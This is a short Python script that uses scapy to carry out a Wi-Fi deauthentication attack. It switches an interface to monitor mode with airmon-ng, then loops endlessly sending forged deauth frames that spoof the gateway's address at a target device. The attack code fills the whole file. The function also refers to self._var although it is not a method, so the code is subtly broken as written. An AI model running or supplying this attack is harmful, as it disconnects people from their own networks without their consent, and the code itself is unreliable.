import os
from scapy.all import (RadioTap, Dot11, Dot11Deauth, sendp, conf)


def run_deauth(target_mac, gateway_mac):
    interface = self._var.interfaces['attack']
    interface_monitor = self._var.interfaces['attack_mon']
    interface_start_monitor_cmd = "sudo airmon-ng start " + interface
    interface_stop_monitor_cmd = "sudo airmon-ng stop " + interface_monitor
    os.system(interface_start_monitor_cmd)
    try:
        while True:
            for i in range(64):
                packet = RadioTap()/Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)/Dot11Deauth(reason=7)
                sendp(packet, inter=0.1, count=10000, iface=interface_monitor, verbose=1)
    except Exception as e:
        print(e)
        os.system(interface_stop_monitor_cmd)
    finally:
        os.system(interface_stop_monitor_cmd)
